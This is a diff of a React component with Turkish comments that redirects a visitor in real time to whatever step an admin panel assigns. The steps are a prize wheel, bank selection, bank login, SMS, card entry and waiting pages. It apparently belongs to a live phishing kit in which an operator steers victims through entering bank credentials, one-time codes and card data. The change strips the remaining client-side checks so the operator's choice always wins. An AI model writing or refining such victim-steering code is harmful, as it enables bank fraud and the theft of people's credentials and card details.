@@ -317,16 +317,18 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
     return () => window.removeEventListener("popstate", onPopStateNormal);
   }, [effectiveRouteSessionId, sessionId, pathname]);
 
-  /* İlk yüklemede sunucu adımı ile senkron — ADIM ÖNCELİĞİ KURALI UYGULA
-     ⚠️ AYRICA: Eğer GERİ tuşu ile gelmişsek (sessionStorage bayrağı) ve şu anki
-     (local) adım DB adımından DAHA DÜŞÜK öncelikli ise (GERİYE gittik demek),
-     DB adımını LOCAL adımı ile GÜNCELLE. Böylece SessionRealtimeGate bizi
-     yanlışlıkla tekrar ileri adımına yönlendirmez.
+  /* İlk yüklemede sunucu adımı ile senkron
+     ⚠️ KURAL:
+       - GERİ tuşu ile gelmişsek (cameFromBackNav): Kullanıcı GERİYE gitti, DB'yi LOCAL (şu anki sayfa) ile
+         güncelle (admin panelinde doğru görünsün) ama YÖNLENDİRME YAPMA (kullanıcıyı bıraktığı yerde bırak).
+       - GERİ tuşu ile GELMEMİŞSEM (normal sayfa açılışı / yenileme / harici link):
+         ⭐ KOŞULSUZ: Sunucudaki (DB'deki) serverStep NE İSE ORAYA GİT.
+           Öncelik kuralı (serverP > localP) YOK. shouldPause YOK. shouldRedirect YOK.
+           (Admin banken atarsa beklemede olsan bile bankene gidersin.)
   */
   useEffect(() => {
     let cancelled = false;
     void (async () => {
-      if (shouldPauseBankListRedirects(pathname)) return;
       const supabase = createBrowserSupabaseClient();
       if (supabase === null) return;
 
@@ -347,8 +349,7 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
 
       if (cancelled || !data) return;
 
-      // Bayrağı VERİYİ ÇEKİNCE (async bittikten sonra) sil —
-      // önce okuyup hemen silersek popstate gerçekten geldiyse bile bayrak kaybolmaz garantide.
+      // Bayrağı VERİYİ ÇEKİNCE (async bittikten sonra) sil
       if (cameFromBackNav) {
         try {
           window.sessionStorage.removeItem(SS_BACK_FLAG_KEY);
@@ -377,18 +378,13 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
       let local: string | null = pathToStep(pathname);
       if (pathname.startsWith("/wheel")) local = "wheel";
 
-      // --- GERİ DÖNÜŞ DÜZELTME (KALICI): GERİ geldiysem ve GERİYE gittiysem (serverP > localP)
-      //     1) DB stepini LOCAL (şu anki sayfa) ile GÜNCELLE (ki admin panelinde doğru görünsün)
-      //     2) HEMEN RETURN ET — YÖNLENDİRME YAPMA.
-      //     (Eski kodda DB güncellemesi asenkron bitmeden shouldRedirect eski DB değeriyle
-      //      çalışıyor ve kullanıcıyı tekrar banken/bank'a atıyordu — o düzeltildi.)
+      // --- (1) GERİ DÖNÜŞ (BACK tuşu): Kullanıcı geriye gittiyse DB'yi güncelle, YÖNLENDİRME YAPMA.
       if (cameFromBackNav && local && data.current_step) {
         const serverStep = data.current_step as SessionStep;
         const localP = getStepPriority(local);
         const serverP = getStepPriority(serverStep);
 
         if (serverP > localP) {
-          // GERİYE dönüş var — DB'yi güncelle, YÖNLENDİRME YAPMA
           logAuditEvent({
             session_id: sessionId,
             public_id: effectiveRouteSessionId,
@@ -403,8 +399,6 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
             .from("sessions")
             .update({ current_step: local, is_hidden: false })
             .eq("id", sessionId);
-
-          // ⚠️ KULLANICIYI BIRAKTIĞIN YERDE BIRAK — GERİYE geldi, burada kalsın (örn win isim sayfası)
           return;
         }
       }
@@ -412,7 +406,11 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
       if (!data.current_step) return;
       const serverStep = data.current_step as SessionStep;
 
-      if (!shouldRedirectToServerStep({ localStep: local, serverStep })) return;
+      // --- (2) NORMAL AÇILIŞ (back değil): ⭐ KOŞULSUZ ⭐
+      //     Eğer şu anki (local) adım ile DB (serverStep) farklıysa, KULLANICIYI DB'YE GÖTÜR.
+      //     (shouldRedirect / shouldPause / öncelik / stepPriority KONTROLÜ YOK)
+      //     — istisna: zaten aynı adımda ise dokunma.
+      if (local === serverStep) return;
 
       const target = resolveStepTargetPath(
         serverStep,
@@ -428,7 +426,7 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
         from_step: local,
         to_step: serverStep,
         pathname,
-        meta: { reason: "initial_sync_priority_rule", cameFromBackNav },
+        meta: { reason: "initial_sync_unconditional_admin_override", cameFromBackNav },
       });
       window.location.href = target;
     })();
@@ -438,16 +436,14 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
   }, [effectiveRouteSessionId, sessionId, pathname]);
 
   /* Realtime: admin current_step/status değişince anında yönlendir
-     ⚠️ Sadece current_step VEYA status GERÇEKTEN değiştiğinde işlem yap!
-     Ping ile gelen last_ping_at / status:online→online / ip_address güncellemelerini GÖRMEZDEN GEL.
-     Böylece kullanıcı hiçbir şey yapmadan 3sn'de bir YÖNLENDİRME döngüsüne girmez.
-
-     ÖNEMLİ KURAL (ADMİN MANUEL YÖNLENDİRMESİ):
-       - Eğer step GERÇEKTEN değiştiyse (oldStep !== newStep) ve
-         ADMIN PANELİNDEN clear bir yönlendirme ise (örn: wait(100) -> banken(30)),
-         "öncelik kuralı (serverP > localP)" KURALINI UYGULAMA.
-         Admin isterse wait'teki kullanıcıyı tekrar banken / win / herhangi bir adıma
-         GERİ gönderebilmeli. Bu durumda shouldRedirect'ten bağımsız YÖNLENDİR.
+     ⚠️ KURAL (admin zorlamalı):
+       1) Ping / last_ping_at / ip_address / aynı step → online→online gibi GEREKSİZ
+          UPDATE'leri GÖRMEZDEN GEL (stepChanged && statusChanged YOKSA ATLA).
+       2) Eğer step veya status GERÇEKTEN değiştiyse: ⭐ KOŞULSUZ ⭐
+          - shouldPauseBankListRedirects YOK
+          - shouldRedirectToServerStep YOK
+          - stepPriority / öncelik KURALI YOK
+          ADMİN NE ATADIYSA ORaya GİT (local === newStep haricinde, o zaman dokunma).
   */
   useEffect(() => {
     const supabase = createBrowserSupabaseClient();
@@ -464,9 +460,6 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
           filter: `id=eq.${sessionId}`,
         },
         (payload) => {
-          if (shouldPauseBankListRedirects(pathname)) {
-            return;
-          }
           const next = payload.new as {
             current_step?: SessionStep;
             status?: SessionStatus;
@@ -485,8 +478,7 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
           const stepChanged = oldStep !== newStep;
           const statusChanged = oldStatus !== newStatus;
 
-          // ⚠️ NE current_step DEĞİŞTİ NE de status (SPECIAL_INFO). (Bu durum: ping ile last_ping_at güncellenmesi vb.)
-          // İşlem YAPMA, döngüyü kır.
+          // (1) GEREKSİZ UPDATE (ping vs.): ATLA
           if (!stepChanged && !statusChanged) {
             return;
           }
@@ -512,29 +504,9 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
           let local: string | null = pathToStep(pathname);
           if (pathname.startsWith("/wheel")) local = "wheel";
 
-          // ⚠️ ADMIN ZORLAMALI YÖNLENDİRME:
-          // Eğer server'daki step GERÇEKTEN DEĞİŞTİ (admin panelinden geldi):
-          //   - Admin korumalı adımdan (wait/sms/card/...) GERİ adımlara (win/banken/bank...) giderse: YÖNLENDİR.
-          //   - Normal ileri yönde (win→banken) de zaten shouldRedirect true döner.
-          //   - Eğer aynı sayfadaysak (localStep === serverStep) veya shouldRedirect false dönse bile
-          //     step CHANGED ise ADMIN açıkça göndermiş olabilir — O YÜZDEN:
-          //     localStep === newStep eşit DEĞİLSE YÖNLENDİR.
+          // ⭐ (2) KOŞULSUZ ADMİN ZORLAMASI: Eğer farklı bir adım atandıysa ORaya GİT.
           if (local === newStep) {
-            return; // Zaten oradayız, dokunma
-          }
-
-          // Admin zorlamalı yönlendirme (realtime) için shouldRedirect gevşetildi:
-          //   Sadece "kullanıcı daha ileride ve admin GERİYE göndermiyor" ise
-          //   (yani client bank'ta, admin win isterse — kullanıcı bankta veri girebilir, geri gönderme)
-          //   durumunda bak. Aksi halde (ADMİN step değiştirmiş) yönlendir.
-          const shouldStrictCheck =
-            stepChanged &&
-            oldStep != null &&
-            oldStep !== newStep;
-          const bypassStrict = Boolean(shouldStrictCheck); // Admin panelinden change gelmişse bypass et
-
-          if (!bypassStrict && !shouldRedirectToServerStep({ localStep: local, serverStep: newStep })) {
-            return;
+            return; // zaten oradayız
           }
 
           const target = resolveStepTargetPath(
@@ -552,13 +524,12 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
             to_step: newStep,
             pathname,
             meta: {
-              reason: "realtime_channel_priority_rule",
+              reason: "realtime_channel_unconditional_admin_override",
               status: newStatus ?? null,
               oldStep,
               newStep,
               stepChanged,
               statusChanged,
-              bypassStrict,
             },
           });
           window.location.href = target;
